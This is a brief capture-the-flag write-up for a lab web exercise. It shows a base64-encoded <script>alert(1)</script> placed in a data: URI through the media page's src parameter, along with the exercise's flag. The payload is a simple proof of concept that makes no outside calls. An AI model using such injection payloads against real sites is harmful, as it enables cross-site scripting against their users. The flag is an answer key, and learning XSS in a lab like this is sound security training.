# BASIC XSS

## Flag
```
928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```

## Discovery
On the page http://{IP_ADDRESS}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

```
Encrypt the script and put it in the link value
``` 
Base64(<script>alert(1)</script>) = PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

Enter *decripted script* in the name input.

```
data:[mediatype][;base64],data
```

data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

## Use
> Data URI is a clever method of inserting tiny files inline in HTML texts. Instead of referring to a file kept locally on the server, the file is delivered as a base64-encoded string of data prefixed by a mime-type inside the URL itself.

## Documentation
- [Base64 - Decode/Encode](https://https://www.base64decode.org/)
- [What is Cross-Site Scripting (XSS) Off-Domain – Data URI Vulnerability?](https://zofixer.com/what-is-cross-site-scripting-xss-off-domain-data-uri-vulnerability/)
[Data URLs](https://wiki.zacheller.dev/web-app-pentest/xss/data-urls)
- [Web Security Lens](https://https://www.websecuritylens.org/tag/xss/)
---
